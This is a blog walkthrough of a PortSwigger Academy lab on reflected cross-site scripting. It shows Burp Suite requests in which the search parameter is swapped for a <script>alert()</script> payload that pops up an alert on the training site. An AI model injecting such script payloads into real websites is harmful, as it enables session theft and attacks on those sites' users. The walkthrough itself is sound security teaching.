---
title: "Reflected XSS into HTML context with nothing encoded Walkthrough"
description: "Do you really know about Reflected XSS ??"
date:  2024-09-28
categories: [Walkthrough]
tags: [PortSwigger, Academy , Lab , PortSwigger Academy Lab , XSS , Cross Site Scripting, Reflected XSS , HTML]
image: 
    path : https://i.imghippo.com/files/Gg1FK1727518360.gif
---



#### <span style="color: Orange;"><b># What do you understand by Reflected XSS ??</b></span>

When an application receives data in an HTTP request and incorporates that data in an unsafe manner inside the instant response, it might lead to reflected cross-site scripting, or XSS.  

Cross-Site Scripting (XSS) is a security vulnerability that arises when an application fails to properly sanitize user input, allowing an attacker to inject malicious scripts. To mitigate XSS, it's crucial to validate, sanitize, and encode user input. I recommend reading up on this topic to gain a deeper understanding. Here's a link to my latest [blog on XSS](https://archtrmntorr.github.io/posts/XXS-For-Beginners-101/).



**Objective :**

```
we have to perform a reflected cross-site scripting attack or have to find this in the search functionality , we can use the *alert* function
```

-> Let's start one of the example lab of reflected xss "Reflected XSS into HTML context with nothing encoded "

![Pasted image 20240720163823.png](https://i.imghippo.com/files/q2r7i1727105627.png)


- as we can see the search functionality in the lab 
- let's enter some thing and see the output 

![[Pasted image 20240720164227.png]](https://i.imghippo.com/files/6lBkc1727105632.png)

- you can see its reflect back on the webpage . 
- In Burp Suite, you can intercept and analyze HTTP requests.

```
GET /?search=nothing HTTP/2
Host: 0a0a001e0459acd9809a49f900770071.web-security-academy.net
Cookie: session=GKTxIIRL5oT8449fvDfBUo9mllMelGYI
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0a001e0459acd9809a49f900770071.web-security-academy.net/?search=nothing
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

- Let's modify our result , a bit to pop up alert

```
GET /?search=<script>alert(nothing)</script> HTTP/2
Host: 0a0a001e0459acd9809a49f900770071.web-security-academy.net
Cookie: session=GKTxIIRL5oT8449fvDfBUo9mllMelGYI
Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a0a001e0459acd9809a49f900770071.web-security-academy.net/?search=nothing
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```

- as we can see we modify our request "nothing" to `<script>alert(nothing)</script>`

![[Pasted image 20240720164731.png]](https://i.imghippo.com/files/7fY0H1727105638.png)

- This is how lab is solved , this type of Getting a POPUP  , we mostly submit during the POC of xss in bug bounty program where we don't just popup alert , instead we weaponize our payload and increase the impact or severity . 

![[Pasted image 20240720164751.png]](https://i.imghippo.com/files/Lhf291727105644.png)

- To learn `impact of reflected XSS attacks` , `reflected XSS in different contexts` and `How to find and test for reflected XSS vulnerabilities` [read my blog on XSS .](https://archtrmntorr.github.io/posts/XXS-For-Beginners-101/)



------------------------------------------------------------------



##### <span style="color: Green;"><b># Final Thoughts</b></span>



I hope this space continues to be helpful in your learning journey!. If you find this blog helpful, I’d love to hear your thoughts—my inbox is always open for feedback. Please excuse any typos, and feel free to point them out so I can correct them. Thanks for understanding and happy learning!. You can contact me on
[Linkedin](https://www.linkedin.com/in/hitesh-sharma-413862245) and [Twitter](https://twitter.com/archtrmntor)











